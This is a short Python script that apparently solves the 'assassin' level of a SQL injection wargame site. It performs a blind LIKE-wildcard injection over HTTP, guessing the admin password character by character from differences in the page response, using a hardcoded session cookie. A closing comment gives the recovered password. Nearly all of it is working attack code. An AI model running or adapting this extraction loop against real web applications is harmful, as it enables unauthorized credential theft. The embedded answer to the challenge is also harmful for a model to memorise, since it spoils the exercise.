import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	for i in range(1,9):
		print("progress : " + str(i))
		for guess in range(48,127):
			print("matching with : " + chr(guess))
			URL='https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw='+password+chr(guess)+'%'
			response = requests.get(URL, cookies=cookies)
			if "Hello admin" in response.text or "Hello guest" in response.text:
				print(str(i)+" number's password : " + chr(guess))
				password+=chr(guess)
				break
			if guess == 126:
				password+=" "

	print("admin's Password : " + password)



if __name__ == "__main__":
	print("Start Program")
	blindi()
	# admin password : 902efd10
